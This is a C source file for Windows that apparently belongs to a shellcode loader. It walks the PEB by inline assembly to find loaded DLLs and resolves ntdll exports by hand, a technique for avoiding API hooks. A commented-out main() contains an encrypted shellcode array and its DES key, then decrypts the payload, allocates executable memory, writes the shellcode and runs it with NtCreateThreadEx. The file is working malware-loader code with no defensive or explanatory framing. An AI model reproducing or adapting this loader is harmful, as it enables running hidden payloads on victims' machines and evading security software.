
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winnt.h>

#include "gate.h"
// #include "injection.h"
size_t get_mod_base(const char *module_name) {
  uintptr_t peb = 0;
  uintptr_t ldr = 0;
  uintptr_t in_memory_order_module_list = 0;

  // Inline assembly to get PEB and module list
  __asm__ __volatile__("mov %%gs:0x60, %0\n\t" // get PEB
                       "mov 0x18(%0), %1\n\t"  // PEB->Ldr
                       "mov 0x10(%1), %2\n\t"  // InMemoryOrderModuleList
                       : "=r"(peb), "=r"(ldr), "=r"(in_memory_order_module_list)
                       :
                       : "memory");

  printf("[+] Found the PEB and the InMemoryOrderModuleList at: %p\n",
         (void *)in_memory_order_module_list);
  printf("[i] Iterating through modules loaded into the process, searching for "
         "%s\n",
         module_name);

  uintptr_t head = in_memory_order_module_list;
  uintptr_t current_entry = head;

  do {
    uintptr_t dll_base = *(uintptr_t *)((char *)current_entry + 0x30);
    uintptr_t module_name_address =
        *(uintptr_t *)((char *)current_entry + 0x60);
    uint16_t module_length = *(uint16_t *)((char *)current_entry + 0x58);

    if (module_name_address != 0 && module_length > 0) {
      wchar_t *dll_name_w = (wchar_t *)module_name_address;
      size_t dll_name_len = module_length / 2; // number of wchar_t characters

      // Allocate buffer for converted ANSI string
      char *dll_name = malloc(dll_name_len * 4 + 1); // safe for multibyte
      if (!dll_name) {
        fprintf(stderr, "Memory allocation failed.\n");
        return 0;
      }

      // Convert wide string to ANSI
      WideCharToMultiByte(CP_ACP, 0, dll_name_w, (int)dll_name_len, dll_name,
                          (int)(dll_name_len * 4 + 1), NULL, NULL);
      dll_name[dll_name_len] = '\0';

      printf("[i] Found module: %s\n", dll_name);

      // Compare case-insensitive
      if (_stricmp(dll_name, module_name) == 0) {
        printf("[+] %s base address found: %p\n", dll_name, (void *)dll_base);
        free(dll_name);
        return dll_base;
      }

      free(dll_name);
    } else {
      printf("Invalid module name address or length.\n");
    }

    // Move to next module (Flink at offset 0x0)
    current_entry = *(uintptr_t *)current_entry;

    // Break if we looped back to the start
  } while (current_entry != head && current_entry != 0);

  printf("Looped back to the start or no module found.\n");
  return 0; // None in Rust
}

const void *get_function_from_exports(size_t dll_base_addr,
                                      const char *needle) {

  // size_t dll_base_addr = get_mod_base(dll_name);
  if (dll_base_addr == 0) {
    printf("critical error\n");
    return NULL;
  }
  uint8_t *dll_base = (uint8_t *)dll_base_addr;
  // Check DOS header
  IMAGE_DOS_HEADER *dos_header = (IMAGE_DOS_HEADER *)dll_base;
  if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
    fprintf(stderr, "DOS header not matched from base address: %p\n", dll_base);
    return NULL;
  }
  printf("[+] DOS header matched\n");

  // Check NT headers
  IMAGE_NT_HEADERS64 *nt_headers =
      (IMAGE_NT_HEADERS64 *)(dll_base + dos_header->e_lfanew);
  if (nt_headers->Signature != IMAGE_NT_SIGNATURE) {
    fprintf(stderr, "NT headers do not match signature from dll base: %p\n",
            dll_base);
    return NULL;
  }
  printf("[+] NT headers matched\n");

  // Get the export directory
  IMAGE_DATA_DIRECTORY export_data_dir =
      nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
  if (export_data_dir.VirtualAddress == 0) {
    fprintf(stderr, "No export directory found\n");
    return NULL;
  }

  IMAGE_EXPORT_DIRECTORY *export_dir =
      (IMAGE_EXPORT_DIRECTORY *)(dll_base + export_data_dir.VirtualAddress);

  // Get the addresses of functions, names, and ordinals
  uint32_t *functions = (uint32_t *)(dll_base + export_dir->AddressOfFunctions);
  uint32_t *names = (uint32_t *)(dll_base + export_dir->AddressOfNames);
  uint16_t *ordinals =
      (uint16_t *)(dll_base + export_dir->AddressOfNameOrdinals);

  DWORD number_of_names = export_dir->NumberOfNames;

  for (DWORD i = 0; i < number_of_names; i++) {
    const char *function_name = (const char *)(dll_base + names[i]);

    if (strcmp(function_name, needle) == 0) {
      printf("[+] Function name found: %s\n", needle);

      // Get function RVA and calculate actual address
      uint16_t ordinal = ordinals[i];
      uint32_t fn_rva = functions[ordinal];
      const void *fn_addr = (const void *)(dll_base + fn_rva);

      printf("[i] Function address: %p\n", fn_addr);
      return fn_addr;
    }
  }

  return NULL; // function not found
}

// void HexToBytes(uint64_t value, BYTE *out) {
//   // Convert to BIG-ENDIAN byte order
//   for (int i = 0; i < 8; i++) {
//     out[7 - i] = (BYTE)(value & 0xFF);
//     value >>= 8;
//   }
// }
//
//// from injection2.c
// unsigned char code[] = {
//     0xEF, 0xC1, 0x90, 0xA9, 0x44, 0x50, 0xBB, 0x2F, 0x93, 0x5E, 0xC6, 0xC4,
//     0x4F, 0x2E, 0xCF, 0xB5, 0x6E, 0x5E, 0x16, 0x3D, 0xE5, 0x98, 0x86, 0x44,
//     0x34, 0xBD, 0x15, 0x44, 0x54, 0xDC, 0x0F, 0x8D, 0xB3, 0x0F, 0x34, 0x5F,
//     0x21, 0x16, 0xF8, 0xB1, 0x13, 0x6D, 0xE1, 0x3B, 0x1C, 0x23, 0x09, 0x96,
//     0x36, 0x1C, 0x82, 0x1D, 0x77, 0x11, 0x55, 0x63, 0x5D, 0xBB, 0x8A, 0x00,
//     0x14, 0x30, 0x22, 0x94, 0x2A, 0xC4, 0x64, 0x52, 0x88, 0x33, 0x60, 0x7C,
//     0x26, 0xFF, 0x99, 0x24, 0x9E, 0x2D, 0x0C, 0x57, 0x43, 0x64, 0x6F, 0xFB,
//     0xA2, 0x94, 0x50, 0x52, 0x68, 0x30, 0x49, 0xF1, 0x3A, 0x3F, 0x0C, 0x4C,
//     0x52, 0x27, 0xA7, 0xE1, 0x9A, 0x22, 0xDF, 0x24, 0x8D, 0xFF, 0xE4, 0xA4,
//     0xA1, 0x14, 0x8B, 0xFC, 0x49, 0x8F, 0x14, 0xC5, 0xCF, 0x82, 0x1A, 0xDE,
//     0x39, 0x2B, 0x75, 0x8B, 0xCB, 0xE7, 0x21, 0xE0, 0x1B, 0xF7, 0x36, 0x89,
//     0xFF, 0xD8, 0x56, 0x39, 0x68, 0x60, 0x84, 0x1D, 0x20, 0x18, 0x6A, 0xF7,
//     0x34, 0x0F, 0x95, 0xAC, 0x11, 0x7F, 0xE3, 0xA2, 0x9C, 0x2B, 0x41, 0xB4,
//     0x27, 0xBE, 0xA7, 0xD0, 0x2E, 0x3A, 0x90, 0xB4, 0x50, 0xDF, 0x13, 0x34,
//     0x87, 0x61, 0xA1, 0x0D, 0x14, 0x94, 0xF9, 0xC1, 0x96, 0x16, 0x2C, 0xAD,
//     0x2F, 0xAC, 0x0A, 0xEB, 0x84, 0x9C, 0x00, 0x59, 0x8A, 0x34, 0x7C, 0xCB,
//     0xE1, 0x02, 0x10, 0x2F, 0x5E, 0xA9, 0x82, 0x6E, 0xA7, 0xF9, 0x15, 0xCA,
//     0xC7, 0x2E, 0x33, 0x15, 0x02, 0xB1, 0x2D, 0x1B, 0x26, 0x77, 0x9B, 0xFC,
//     0xB4, 0x8D, 0xAB, 0x2B, 0x05, 0xE4, 0xF6, 0x37, 0x1C, 0x05, 0x7E, 0xF3,
//     0xFB, 0xEC, 0xD0, 0xC8, 0x49, 0x66, 0x14, 0xC5, 0x76, 0xCD, 0x5B, 0xA0,
//     0xC1, 0xB1, 0xA7, 0x3F, 0xB7, 0xD5, 0xE5, 0xAA, 0x98, 0x7B, 0x01, 0x71,
//     0xD3, 0xED, 0xF8, 0x54, 0xC1, 0x09, 0x69, 0x1D, 0x18, 0xF6, 0x2C, 0x11,
//     0x54, 0xA0, 0x13, 0x20, 0x5B, 0xBF, 0x83, 0x95, 0xDC, 0x1A, 0x6D, 0xF1,
//     0x9E, 0x3A, 0xFD, 0xA3, 0x45, 0xAA, 0x14, 0xD1, 0xAE, 0x03, 0x5A, 0x8C,
//     0x00, 0xB7, 0x69, 0x62, 0xE4, 0xD1, 0x3C, 0xA6, 0x9E, 0xFD, 0x5E, 0xDA,
//     0xAD, 0x17, 0x99, 0x8E, 0x5E, 0x67, 0xC1, 0xF8, 0x55, 0xDC, 0x63, 0xF8,
//     0x40, 0x32, 0xA7, 0x3B, 0x46, 0x4C, 0xF0, 0x89};
//
// const char *hexStr = "0xE6F8BA01B632238F";
//
// #define InitializeObjectAttributes(p) \
//   (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
//   (p)->RootDirectory = NULL; \
//   (p)->Attributes = 0; \
//   (p)->ObjectName = NULL; \
//   (p)->SecurityDescriptor = NULL; \ (p)->SecurityQualityOfService = NULL;
//
// int main() {
//   size_t ntdll = get_mod_base("ntdll.dll");
//   const void *testAddr = get_function_from_exports(ntdll, "NtOpenProcess");
//   NtOpenProcess_t ntOpenProcessptr = (NtOpenProcess_t)testAddr;
//   STARTUPINFOW si = {0};
//   PROCESS_INFORMATION pi = {0};
//
//   // LPWSTR appName = L"C:\\Windows\\System32\\notepad.exe";
//
//   // if (!CreateProcessW(appName, NULL, NULL, NULL, FALSE,
//   //                     BELOW_NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi))
//   {
//   //   return EXIT_FAILURE;
//   // }
//   DWORD dwProcessId = GetCurrentProcessId();
//   si.cb = sizeof(si);
//
//   Sleep(3000);
//   PSIZE_T bytesWritten;
//   HANDLE targetProcess = {0};
//   OBJECT_ATTRIBUTES obj;
//   CLIENT_ID cid;
//   cid.UniqueProcess = (HANDLE)(ULONG_PTR)dwProcessId;
//   cid.UniqueThread = NULL;
//   InitializeObjectAttributes(&obj);
//   NTSTATUS status =
//       ntOpenProcessptr(&targetProcess, PROCESS_VM_WRITE, &obj, &cid);
//
//   if (status != 0) {
//     return status;
//   }
//
//   status = ntOpenProcessptr(&targetProcess, PROCESS_VM_OPERATION, &obj,
//   &cid);
//
//   if (status != 0) {
//     return status;
//   }
//
//   status = ntOpenProcessptr(&targetProcess, PROCESS_ALL_ACCESS, &obj, &cid);
//
//   if (status != 0) {
//     return status;
//   }
//
//   int isNUll = targetProcess == NULL;
//   printf("is handle null? %s\n", isNUll ? "true" : "false");
//   if (isNUll) {
//     printf("target process is NULL, failed!\n");
//     return EXIT_FAILURE;
//   }
//
//   const void *allocateMemoryPtr =
//       get_function_from_exports(ntdll, "NtAllocateVirtualMemory");
//
//   const char *hexStr = "0xE6F8BA01B632238F";
//   uint64_t value = 0;
//
//   if (sscanf(hexStr, "%llx", &value) != 1) {
//     printf("Invalid hex string\n");
//     return EXIT_FAILURE;
//   }
//
//   BYTE keyData[8];
//   HexToBytes(value, keyData);
//
//   HCRYPTPROV hProv = 0;
//   if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL,
//                            CRYPT_VERIFYCONTEXT)) {
//     printf("CryptAcquireContext failed: %lu\n", GetLastError());
//     return EXIT_FAILURE;
//   }
//   // Build PLAINTEXTKEYBLOB
//   BYTE keyBlob[sizeof(BLOBHEADER) + sizeof(DWORD) + 8];
//
//   BLOBHEADER *hdr = (BLOBHEADER *)keyBlob;
//   hdr->bType = PLAINTEXTKEYBLOB;
//   hdr->bVersion = CUR_BLOB_VERSION;
//   hdr->reserved = 0;
//   hdr->aiKeyAlg = CALG_DES;
//
//   *(DWORD *)(keyBlob + sizeof(BLOBHEADER)) = 8;
//
//   memcpy(keyBlob + sizeof(BLOBHEADER) + sizeof(DWORD), keyData, 8);
//
//   // Import key
//   HCRYPTKEY hKey = 0;
//
//   if (!CryptImportKey(hProv, keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {
//     printf("CryptImportKey failed: %lu\n", GetLastError());
//     CryptReleaseContext(hProv, 0);
//     return EXIT_FAILURE;
//   }
//   DWORD bufLen = 320;
//
//   PVOID buffer = NULL;
//   SIZE_T bufferSize = 0x1000;
//   if (!CryptDecrypt(hKey, 0, TRUE, 0, code, &bufLen)) {
//     printf("CryptDecrypt failed: %lu\n", GetLastError());
//     // free(keyBlob);
//     CryptDestroyKey(hKey);
//     CryptReleaseContext(hProv, 0);
//     return 1;
//   }
//
//   printf("decrypted!\n");
//
//   NtAllocateVirtualMemory VirtualMemory =
//       (NtAllocateVirtualMemory)allocateMemoryPtr;
//   VirtualMemory(targetProcess, (PVOID *)&buffer, (ULONG_PTR)0, &bufferSize,
//                 (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
//
//   const void *writeVirtualMem =
//       get_function_from_exports(ntdll, "NtWriteVirtualMemory");
//   NtWriteVirtualMemory WriteMemory = (NtWriteVirtualMemory)writeVirtualMem;
//   status = WriteMemory(targetProcess, buffer, code, sizeof(code),
//   bytesWritten); if (status != 0) {
//     printf("failed to write virtual memory: %ld", status);
//     return status;
//   }
//   HANDLE hThread;
//   const void *CreateThreadptr =
//       get_function_from_exports(ntdll, "NtCreateThreadEx");
//   NtCreateThreadEx createThread = (NtCreateThreadEx)CreateThreadptr;
//
//   status =
//       createThread(&hThread, GENERIC_EXECUTE, NULL, targetProcess,
//                    (LPTHREAD_START_ROUTINE)buffer, NULL, FALSE, 0, 0, 0,
//                    NULL);
//   if (status != 0) {
//     printf("failed to create thread: %ld", status);
//     return status;
//   }
//
//   const void *waitForptr =
//       get_function_from_exports(ntdll, "NtWaitForSingleObject");
//   NtWaitForSingleObject waitFor = (NtWaitForSingleObject)waitForptr;
//   status = waitFor(hThread, FALSE, NULL);
//
//   if (status != 0) {
//     printf("failed to wait for thread: %ld", status);
//     return status;
//   }
// }
